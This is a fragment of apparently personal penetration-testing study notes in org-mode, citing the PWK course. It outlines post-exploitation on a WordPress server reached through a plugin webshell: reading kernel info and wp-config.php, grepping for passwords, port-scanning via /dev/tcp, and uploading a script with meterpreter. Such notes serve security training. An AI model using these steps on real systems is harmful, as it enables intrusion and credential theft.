...
cat /proc/version # Linux version 5.8.0-53-generic (buildd@lcy01-amd64-012) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #60~20.04.1-Ubuntu SMP Thu May 6 09:52:46 UTC 2021
pwd # /var/www/html/wp-content/plugins/plugin-shell
cd /var/www/html
ls -lah
cat wp-config.php # find config file, or:
grep -rnw '/path/to/somewhere/' -e 'PASSWORD' ## grep match in the folder
  ...
  ## ref: [[https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux]]
     ...
     + enum opened port, check DB default ports first maybe? (/dev/tcp/host/port) (portscan.sh)
     #+BEGIN_SRC bash
#!/bin/bash
...
# (PWK p778)
     #+END_SRC
       - info: when used in redirection, bash handles "/dev/tcp/host/port" differently.
       - ref: [[https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Redirections][bash redirections]]
     + upload the file
     #+BEGIN_SRC bash
# meterpreter > upload /home/kali/portscan.sh /tmp/portscan.sh
# meterpreter > shell
# or use webshell to write directly, or use wget to download from http server?
